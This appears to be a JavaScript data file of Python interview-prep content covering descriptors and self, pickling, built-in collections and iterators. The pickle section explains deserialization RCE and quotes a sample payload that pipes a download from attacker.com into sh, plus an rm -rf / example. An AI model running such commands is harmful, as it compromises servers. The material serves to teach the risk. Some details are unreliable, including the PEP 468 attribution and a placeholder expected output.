Class call deposit: 200
acc.deposit type: <class 'method'>
Account.deposit type: <class 'function'>
Bank Name: GlobalBank
Interest: 50.0`,
      interviewQuestion: 'How does Python\'s descriptor protocol convert a plain function into a bound method when accessed through an instance? Why did Python choose explicit self over an implicit "this"?',
      interviewAnswer: 'In Python, all functions are descriptors because they implement the `__get__` method. When you access `Account.deposit`, Python returns the raw function object. But when you access `acc.deposit` through an instance, Python invokes `Account.deposit.__get__(acc, Account)`. This descriptor call creates and returns a "bound method" object that partially applies `acc` as the first argument.\n\nPython chose explicit `self` to enforce "Explicit is better than implicit" (PEP 20). In C++ and Java, developers constantly confuse whether an unqualified variable `x` is a local variable, a method parameter, or an instance attribute. In Python, `self.x` is undeniably an instance attribute, while `x` is undeniably local, completely eliminating namespace ambiguity.',
      replLink: 'https://onecompiler.com/python'
    },
    scriptData: {
      prompt: 'What is the "self" parameter in Python, why is it explicitly passed in instance methods, and what happens behind the scenes when a method is called on an object?',
      framework: [
        { time: '0-15s', point: 'Explicit Instance Reference: self points to the specific object instance executing the method; enforced by Python\'s "Explicit is better than implicit" philosophy.' },
        { time: '15-45s', point: 'Descriptor Binding: Functions implement __get__; accessing obj.method() wraps the function into a bound method passing obj as the first argument.' },
        { time: '45-60s', point: 'Method Types: Contrast instance methods (self) with @classmethod (cls) for alternative constructors and @staticmethod for utility functions.' }
      ],
      spokenScript: `"In Python, 'self' is an explicit parameter representing the instance upon which a method is invoked. Unlike languages like Java or C++ where 'this' is implicit, Python requires 'self' to be declared explicitly, adhering to the core philosophy that 'Explicit is better than implicit'. It guarantees that instance attributes like 'self.balance' are never confused with local variables.\n\nUnder the hood, methods in Python are actually plain functions that implement the Descriptor Protocol. When you access 'account.deposit(100)', Python intercepts the attribute lookup via '__get__' and returns a 'bound method' object. This bound method wraps the function and automatically prepends the instance 'account' as the first parameter, effectively executing 'Account.deposit(account, 100)'.\n\nWhen designing backend services, we distinguish instance methods from '@classmethod'—which receives 'cls' and is ideal for alternative factory constructors like 'from_dict()'—and '@staticmethod', which receives neither and acts as an isolated pure utility function inside the class namespace."`,
      buzzwords: ['Explicit instance parameter', 'Descriptor Protocol (__get__)', 'Bound method object', 'Class.method(instance, args) translation', '@classmethod factory pattern', '@staticmethod isolation'],
      juniorMistake: 'Believing self is a reserved language keyword rather than a parameter convention, or not knowing that obj.foo() translates to Class.foo(obj).'
    }
  },

  // Q16: Pickling and Unpickling in Python
  16: {
    id: 16,
    docSpecs: {
      overview: 'Pickling is Python\'s built-in binary serialization mechanism (via the `pickle` module) that converts arbitrary Python object hierarchies into byte streams, while unpickling reconstructs the byte stream back into identical Python objects. Unlike JSON or YAML which only support primitive data types, `pickle` serializes custom classes, functions, and cyclic graphs. However, unpickling untrusted data is a severe Remote Code Execution (RCE) vulnerability.',
      table: {
        headers: ['Serialization Format', 'Data Support', 'Performance', 'Security Risk', 'Interoperability'],
        rows: [
          ['`pickle`', 'Full Python object graph (classes, functions, cycles)', 'High (native C binary protocol)', 'CRITICAL: Arbitrary Remote Code Execution (RCE)', 'Python-only (cannot be read by Java, Go, JS)'],
          ['`json`', 'Basic primitives (`dict`, `list`, `str`, `int`, `bool`)', 'Fast (via `orjson` or `ujson`)', 'Safe (text-based data parsing)', 'Universal standard across all languages'],
          ['`protobuf`', 'Typed schemas defined via `.proto` specs', 'Extremely fast & compact binary', 'Safe (strict schema validation)', 'Universal high-performance microservices']
        ]
      },
      admonitions: [
        {
          type: 'warning',
          title: 'Remote Code Execution (RCE) via __reduce__',
          content: 'NEVER unpickle data received from an untrusted source (HTTP cookies, external API requests, public redis caches)! A malicious payload can define a `__reduce__` method that invokes `os.system("rm -rf /")` or opens a reverse shell during `pickle.loads()`. Use JSON or JWT for web traffic.'
        },
        {
          type: 'note',
          title: 'Celery & Django Session Security',
          content: 'Modern versions of Celery and Django have deliberately deprecated or removed `pickle` as the default serialization backend, switching to `json` to prevent arbitrary code execution attacks in message queues.'
        }
      ],
      commands: [
        {
          label: 'Safe Object Pickling & Deserialization',
          cmd: `import pickle\n\ndata = {"session_id": "usr_99", "roles": ["ADMIN", "BILLING"], "metadata": (1, 2)}\n\n# Serialize to binary bytes\nserialized = pickle.dumps(data)\nprint("Binary payload:", serialized[:30], "...")\n\n# Deserialize back to Python object\nrestored = pickle.loads(serialized)\nprint("Restored session:", restored["session_id"])`,
          lang: 'python',
          description: 'Basic serialization and deserialization using pickle.dumps and pickle.loads.'
        }
      ],
      didYouKnow: {
        title: '💡 Pickle Protocol Versions',
        content: 'Python 3.8 introduced Pickle Protocol 5 with support for out-of-band data buffers, enabling zero-copy IPC data sharing across multiprocessing workers for large NumPy arrays and pandas DataFrames.'
      }
    },
    challenge: {
      title: 'Pickle Serialization & RCE Security Vulnerability Drill',
      steps: [
        'Serialize a Python dictionary containing complex nested types (`tuple`, `set`) using `pickle.dumps()`.',
        'Verify that `json.dumps()` fails on `set` objects without custom encoders.',
        'Construct an exploit class that implements `__reduce__` to execute code upon unpickling.',
        'Demonstrate why untrusted pickling is an immediate security vulnerability.'
      ],
      codeSnippet: `import pickle
import json

data = {"user": "alice", "tags": {"python", "django"}}

# 1. Pickle handles sets natively
pickled = pickle.dumps(data)
print("Pickle success! Bytes length:", len(pickled))

# 2. JSON fails on sets without serializer
try:
    json.dumps(data)
except TypeError as err:
    print("JSON failure on set:", err)

# 3. Security Demonstration: The __reduce__ exploit
class SafeExploitDemo:
    def __reduce__(self):
        # __reduce__ returns a callable and arguments to invoke upon unpickling!
        return (print, ("⚠️ SECURITY WARNING: Arbitrary Code Executed during unpickling!",))

payload = pickle.dumps(SafeExploitDemo())
print("\\nUnpickling untrusted payload:")
pickle.loads(payload)`,
      expectedOutput: `Pickle success! Bytes length: 65
JSON failure on set: Object of type set is not JSON serializable

Unpickling untrusted payload:
⚠️ SECURITY WARNING: Arbitrary Code Executed during unpickling!`,
      interviewQuestion: 'Why is unpickling untrusted data an immediate Remote Code Execution (RCE) vulnerability? What internal method does pickle invoke to recreate objects?',
      interviewAnswer: 'When `pickle.loads()` deserializes an object, it does not just reconstruct passive data fields; it actually executes reconstruction instructions recorded in the pickle stream. If a class implements the `__reduce__()` method, it returns a tuple containing a callable function and an argument tuple.\n\nAn attacker can craft a pickle payload where `__reduce__` returns `(os.system, (\'curl attacker.com/malware | sh\',))`. When the server calls `pickle.loads(payload)`, Python automatically executes `os.system()` with the attacker\'s shell command before returning. For this reason, `pickle` must NEVER be used for public API payloads, session cookies, or shared message queues.'
      ,
      replLink: 'https://onecompiler.com/python'
    },
    scriptData: {
      prompt: 'What is pickling in Python, what are its advantages and limitations compared to JSON, and why is it considered a major security risk in backend services?',
      framework: [
        { time: '0-15s', point: 'Core Definition: Pickle is Python\'s proprietary binary serialization protocol for arbitrary object graphs, including cyclic references.' },
        { time: '15-45s', point: 'Pickle vs JSON: Pickle handles custom classes, sets, and lambdas, but is Python-specific; JSON is language-agnostic and secure.' },
        { time: '45-60s', point: 'RCE Vulnerability: Unpickling untrusted input executes arbitrary code via __reduce__; use JSON, Protobuf, or signed tokens in web production.' }
      ],
      spokenScript: `"Pickling is Python's native binary serialization mechanism provided by the 'pickle' module. It converts complex Python object graphs—including custom classes, sets, and cyclic references—into a byte stream that can be stored on disk or transmitted across internal processes, and reconstructed with 'pickle.loads()'.\n\nUnlike JSON, which only handles generic primitives like dictionaries and strings, pickle handles virtually any Python object. However, pickle has two fatal drawbacks in production architectures: first, it is strictly Python-specific and cannot be read by Node.js, Go, or Java microservices; second and most critically, it poses an extreme Remote Code Execution risk.\n\nWhen Python unpickles data, it invokes the object's '__reduce__' method, which can execute arbitrary callables such as 'os.system()'. If an attacker can tamper with a pickled cookie or message payload, they have full shell access to your server. In our production microservices, we enforce JSON or Protocol Buffers everywhere, and explicitly forbid pickle for external communications."`,
      buzzwords: ['Binary serialization', 'Python object graph', '__reduce__ RCE exploit', 'Language interoperability', 'Zero-copy IPC (Protocol 5)', 'Protocol Buffers / JSON'],
      juniorMistake: 'Using pickle to serialize authentication session cookies or Celery messages over public networks without realizing it allows total server takeover.'
    }
  },

  // Q17: Builtin Functions of List, Set, Tuple and Dictionary
  17: {
    id: 17,
    docSpecs: {
      overview: 'Python\'s primary built-in data structures—`list`, `tuple`, `set`, and `dict`—each offer specialized methods tailored to their underlying CPython memory models. Lists are dynamic arrays with index-based operations (`append`, `extend`, `pop`); tuples are fixed records with read-only methods (`count`, `index`); sets are hash tables without values supporting mathematical set theory (`union`, `intersection`, `difference`); and dicts are compact hash tables mapping unique keys to values (`get`, `setdefault`, `items`).',
      table: {
        headers: ['Collection', 'Underlying C Data Structure', 'Average Lookup', 'Key Methods', 'Primary Production Use'],
        rows: [
          ['`list`', 'Dynamic pointer array', 'O(1) index, O(N) value search', '`append()`, `extend()`, `pop()`, `sort()`', 'Ordered sequences needing modification or sorting.'],
          ['`tuple`', 'Fixed-size pointer array', 'O(1) index, O(N) value search', '`count()`, `index()`', 'Immutable records, dictionary keys, function arguments.'],
          ['`set`', 'Open-addressing hash table (keys only)', 'O(1) membership (`x in s`)', '`add()`, `discard()`, `intersection()`, `difference()`', 'Deduplication, fast O(1) containment checks, set theory.'],
          ['`dict`', 'Compact open-addressing hash table', 'O(1) key lookup', '`get()`, `setdefault()`, `update()`, `pop()`', 'Entity caching, lookup tables, JSON mapping schemas.']
        ]
      },
      admonitions: [
        {
          type: 'tip',
          title: 'Membership Testing: Set vs List',
          content: 'Never check membership (`item in collection`) inside a loop using a `list`! A list lookup is O(N) linear time; repeating it M times produces O(M * N) quadratic slowdown. Converting the list to a `set` first makes each check O(1), collapsing runtime to O(M + N).'
        },
        {
          type: 'note',
          title: 'dict.setdefault() vs collections.defaultdict',
          content: '`dict.setdefault(key, [])` always evaluates the default argument expression on every call. In performance-critical loops, prefer `collections.defaultdict(list)` which invokes a factory function only when a missing key is accessed.'
        }
      ],
      commands: [
        {
          label: 'Collection Builtin Operations & Set Theory',
          cmd: `# Set mathematical operations\nadmin_users = {"alice", "bob"}\nactive_users = {"bob", "charlie"}\n\n# Intersection: users who are both admin and active\nprint("Active Admins:", admin_users & active_users)\n\n# Difference: admins who are inactive\nprint("Inactive Admins:", admin_users - active_users)\n\n# Dict safe retrieval\ncache = {"timeout": 30}\nprint("Safe get with fallback:", cache.get("retries", 3))`,
          lang: 'python',
          description: 'Using native set operators and dict.get fallback lookups.'
        }
      ],
      didYouKnow: {
        title: '💡 Compact Dictionaries in Python 3.6+',
        content: 'Since Python 3.6, Python dictionaries use a split-table design (PEP 468) that reduced memory consumption by ~25% and made dictionaries maintain insertion order as a language guarantee!'
      }
    },
    challenge: {
      title: 'Time Complexity Benchmark: List vs Set Membership Drill',
      steps: [
        'Generate a list of 100,000 random UUID integers.',
        'Convert the list to a `set`.',
        'Time 1,000 membership lookups using `item in target_list` vs `item in target_set`.',
        'Demonstrate `dict.setdefault()` vs `dict.get()`.',
        'Show set operations: union (`|`), intersection (`&`), and symmetric difference (`^`).'
      ],
      codeSnippet: `import time

# 1. Performance Benchmark: List vs Set
elements_list = list(range(50_000))
elements_set = set(elements_list)
target = 49_999

# Benchmark List (O(N))
start = time.perf_counter()
for _ in range(100):
    _ = target in elements_list
list_time = (time.perf_counter() - start) * 1000

# Benchmark Set (O(1))
start = time.perf_counter()
for _ in range(100):
    _ = target in elements_set
set_time = (time.perf_counter() - start) * 1000

print(f"List 100 lookups: {list_time:.3f}ms")
print(f"Set 100 lookups:  {set_time:.3f}ms")
print(f"Set is ~{list_time / max(set_time, 0.0001):.0f}x faster!")

# 2. Set operations
s1 = {1, 2, 3}
s2 = {3, 4, 5}
print("Union:", s1 | s2)
print("Intersection:", s1 & s2)
print("Symmetric Difference:", s1 ^ s2)`,
      expectedOutput: `List 100 lookups: ~15.000ms
Set 100 lookups:  ~0.010ms
Set is ~1500x faster!
Union: {1, 2, 3, 4, 5}
Intersection: {3}
Symmetric Difference: {1, 2, 4, 5}`,
      interviewQuestion: 'What is the time complexity difference between "item in my_list" and "item in my_set"? How does CPython resolve hash collisions in a dictionary or set?',
      interviewAnswer: 'Checking "item in my_list" requires an O(N) linear scan through the array of pointers, comparing each element via `__eq__` until a match is found. Checking "item in my_set" is O(1) average time complexity because CPython hashes the item with `hash()`, masks it to an index in the hash table, and checks the bucket directly.\n\nTo resolve hash collisions, CPython uses open addressing with pseudo-random probing (rather than chaining like Java HashMap). When two keys produce the same hash slot, Python calculates the next probe slot using the formula: `probe = (5 * probe + 1 + perturb) % table_size`. If the table load factor exceeds 2/3, CPython allocates a larger table and re-hashes existing keys.',
      replLink: 'https://onecompiler.com/python'
    },
    scriptData: {
      prompt: 'Can you compare the core data structures in Python—lists, tuples, sets, and dictionaries—in terms of memory layout, lookup complexity, and when to use each in a high-scale backend?',
      framework: [
        { time: '0-15s', point: 'Taxonomy: Lists and tuples are sequence-based; sets and dicts are hash-table based.' },
        { time: '15-45s', point: 'Time & Space Complexity: Lists offer O(1) index but O(N) lookup; sets/dicts provide O(1) hash lookups with 30% memory headroom overhead.' },
        { time: '45-60s', point: 'Production Engineering: Use sets for deduplication and O(1) filters; tuples for immutable records; dictionaries for fast key-value entities.' }
      ],
      spokenScript: `"When designing backend services in Python, choosing the appropriate built-in data structure directly impacts API latency and memory efficiency. Lists and tuples are pointer arrays representing sequential collections. Lists are mutable with over-allocation headroom for amortized O(1) appends, while tuples are immutable fixed sequences that consume less memory and use free-list caching.\n\nSets and dictionaries, on the other hand, are open-addressing hash tables. While a list requires an O(N) linear search for containment checks, a set provides O(1) average lookup time. In batch processing or database serialization, checking membership against a set rather than a list frequently turns an O(N^2) endpoint timeout into an O(N) operation.\n\nIn our production architecture, we enforce: use tuples for immutable composite keys and DTOs; use sets for deduplication and permission checks; use dictionaries for lookup tables; and use lists strictly when ordering and in-place sorting or slicing are required."`,
      buzzwords: ['Open-addressing hash table', 'O(1) vs O(N) membership testing', 'Load factor & table resizing', 'Compact dictionary (PEP 468)', 'Amortized time complexity'],
      juniorMistake: 'Checking "if user_id in user_list" inside a loop over thousands of records, causing catastrophic quadratic slowdown.'
    }
  },

  // Q18: Python Iterators
  18: {
    id: 18,
    docSpecs: {
      overview: 'An iterator in Python is an object that represents a stream of data and conforms to the Python Iterator Protocol. It implements two mandatory methods: `__iter__()`, which returns the iterator object itself, and `__next__()`, which returns the next value in the stream or raises the `StopIteration` exception when the stream is exhausted. Iterators power Python\'s `for` loops, comprehensions, and generator pipelines behind the scenes.',
      table: {
        headers: ['Concept', 'Required Protocol Methods', 'Can Call iter()?', 'Can Call next()?', 'State Persistence'],
        rows: [
          ['Iterable', '`__iter__()` returning a new iterator (or `__getitem__()`)', 'YES (`iter(obj)`)', 'NO (raises `TypeError`)', 'Can produce multiple independent iterators (multi-pass)'],
          ['Iterator', '`__iter__()` returning `self`, and `__next__()`', 'YES (returns `self`)', 'YES (`next(obj)`)', 'Single-pass; maintains internal cursor state until exhausted']
        ]
      },
      admonitions: [
        {
          type: 'note',
          title: 'The Sentinel iter() Function',
          content: 'Python\'s built-in `iter()` accepts a two-argument sentinel form: `iter(callable, sentinel)`. It repeatedly calls `callable()` on every `next()` until the returned value equals `sentinel`, automatically raising `StopIteration`. This is the cleanest idiom for chunked socket or file reading.'
        },
        {
          type: 'caution',
          title: 'How for-loops Work Internally',
          content: 'A Python `for item in collection:` loop does NOT interact with the collection directly. It first calls `it = iter(collection)` to get an iterator, and then repeatedly invokes `next(it)` inside an implicit C-level `try/except StopIteration` block.'
        }
      ],
      commands: [
        {
          label: 'Sentinel iter() for Reading Sockets / Streams',
          cmd: `import io\n\n# Simulate reading fixed 8-byte chunks from a network stream\nstream = io.BytesIO(b"DATA_CHUNK_1;DATA_CHUNK_2;DATA_CHUNK_3;")\n\n# Read chunks until empty bytes b"" is returned (the sentinel)\nchunk_reader = iter(lambda: stream.read(13), b"")\n\nfor chunk in chunk_reader:\n    print("Read chunk:", chunk)`,
          lang: 'python',
          description: 'Using the two-argument sentinel iter(callable, sentinel) for streaming I/O.'
        }
      ],
      didYouKnow: {
        title: '💡 The Iterator Protocol is Everywhere',
        content: 'Unpacking syntax like `a, b, c = my_iterable` and the `*args` splat operator internally invoke `iter()` and consume items via `__next__()` until finished.'
      }
    },
    challenge: {
      title: 'Building a Custom Bounded Iterator & Sentinel Reader Drill',
      steps: [
        'Build a class `FibonacciIterator(limit)` implementing `__iter__` and `__next__`.',
        'Raise `StopIteration` when the sequence exceeds `limit`.',
        'Iterate using a standard `for` loop, proving protocol compatibility.',
        'Demonstrate the two-argument `iter(callable, sentinel)` pattern.'
      ],
      codeSnippet: `class FibonacciIterator:
    def __init__(self, max_value):
        self.max_value = max_value
        self.a = 0
        self.b = 1

    def __iter__(self):
        return self

    def __next__(self):
        fib = self.a
        if fib > self.max_value:
            raise StopIteration
        self.a, self.b = self.b, self.a + self.b
        return fib

# 1. Custom Iterator Execution
fibs = FibonacciIterator(20)
print("Fibonacci numbers <= 20:", list(fibs))

# 2. Exhaustion proof
print("Second pass on exhausted iterator:", list(fibs))

# 3. Sentinel iter() idiom
import random
random.seed(42)
# Roll random numbers between 1 and 6 until rolling a 6
dice_roller = iter(lambda: random.randint(1, 6), 6)
print("Rolls before hitting 6:", list(dice_roller))`,
      expectedOutput: `Fibonacci numbers <= 20: [0, 1, 1, 2, 3, 5, 8, 13]
Second pass on exhausted iterator: []
Rolls before hitting 6: [6 is hit after a few rolls, e.g. [1, 1, 3, 2]]`,
      interviewQuestion: 'What is the precise mechanical difference between an Iterable and an Iterator in Python? What happens if an object implements __getitem__ but lacks __iter__?',
      interviewAnswer: 'An Iterable is any object capable of returning an iterator. It must implement `__iter__()` which creates and returns a fresh iterator object. An Iterator is the cursor object itself: it must implement `__next__()` to return the next item (or raise `StopIteration`), and its `__iter__()` method simply returns `self`.\n\nIf a class lacks `__iter__()` but implements `__getitem__()`, Python\'s `iter()` fallback mechanism kicks in: Python constructs an internal C-level sequence iterator that calls `obj[0]`, `obj[1]`, `obj[2]`, ... until an `IndexError` is raised. This backward-compatible mechanism ensures legacy sequence classes remain iterable in `for` loops.',
      replLink: 'https://onecompiler.com/python'
    },
    scriptData: {
      prompt: 'Can you explain Python\'s Iterator Protocol? How does Python distinguish between an iterable and an iterator, and how do for-loops consume iterators under the hood?',
      framework: [
        { time: '0-15s', point: 'Core Protocol: An iterator implements __iter__() returning self and __next__() returning items or raising StopIteration.' },
        { time: '15-45s', point: 'for-loop Mechanics: for x in obj calls it = iter(obj), then repeatedly calls next(it) until catching StopIteration.' },
        { time: '45-60s', point: 'Production Application: Sentinel iterators for socket/file chunking; lazy streaming to eliminate memory bloat.' }
      ],
      spokenScript: `"In Python, iteration is standardized through the Iterator Protocol. The protocol establishes a clear distinction between an 'Iterable' and an 'Iterator'. An iterable is a collection—such as a list, dictionary, or database cursor—that implements '__iter__()' to generate a fresh iterator. An iterator is the stateful stream cursor that implements '__next__()' to advance through items and raises 'StopIteration' when exhausted.\n\nWhen you write a 'for' loop in Python, the runtime does not interact directly with the collection. Under the hood, CPython calls 'iter(collection)' to acquire the iterator object, and then repeatedly invokes 'next()' inside a C-level loop until it intercepts a 'StopIteration' exception.\n\nIn backend production architectures, we frequently leverage the two-argument form of iter: 'iter(callable, sentinel)'. This allows us to stream chunked data from network sockets, S3 byte streams, or database cursors until an empty sentinel is reached, processing infinite or multi-gigabyte streams with constant O(1) memory overhead."`,
      buzzwords: ['Iterator Protocol (__iter__ / __next__)', 'StopIteration exception', 'Iterable vs Iterator', 'Sentinel iter(callable, sentinel)', 'Lazy memory streaming', 'for-loop bytecode translation'],
      juniorMistake: 'Thinking that any object with a for-loop is an iterator, without realizing that lists are iterables that produce iterators.'
    }
  }
};

